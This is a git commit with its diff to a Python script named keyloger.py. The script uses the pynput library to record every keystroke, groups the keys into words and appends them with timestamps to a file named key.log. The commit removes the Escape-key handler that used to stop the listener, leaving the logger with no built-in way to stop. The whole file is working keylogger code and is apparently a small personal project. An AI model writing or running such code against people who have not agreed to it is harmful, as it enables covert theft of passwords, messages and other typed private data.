738a06435aef213a9b2a5f5502e16b918815f7f2
hedi-ch <hedicherni202@gmail.com>
2022-06-14 20:18:16 +0100

    remouve the esc function

--- keyloger.py
+++ keyloger.py
@@ -2,43 +2,28 @@ from pynput.keyboard import Key, Listener
 import logging
 
 word=''
-word_list=[]
 word_count=0
 
 
 logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')
 
 
-
 def on_press(key):
 	global word , word_count
+	
 	if key==Key.space or key ==Key.enter:
 		key=" "
+	
 	if word_count==10 or key==" ":
 		word_count=0
-		word_list.append(word)
 		logging.info(word)
 		word=str(key)[1:-1]
+	
 	elif word_count<10:
 		word_count+=1
 		print(f"the {key} key is pressed ")
 		word+=str(key)[1:-1]
 	
-	#try:
-	#	print(f"the {key} key is pressed ")first 
-	#except AttributeError:first 
 
-	#	print(f"special key {key} is pressed ")first mots and2 motshelo
-
-
-
-def on_release(key):
-	if key==Key.esc:
-		return False
-	
-
-with Listener(on_press=on_press ,on_release=on_release) as listener:
+with Listener(on_press=on_press) as listener:
 	listener.join()
-
-
-print(word_list)
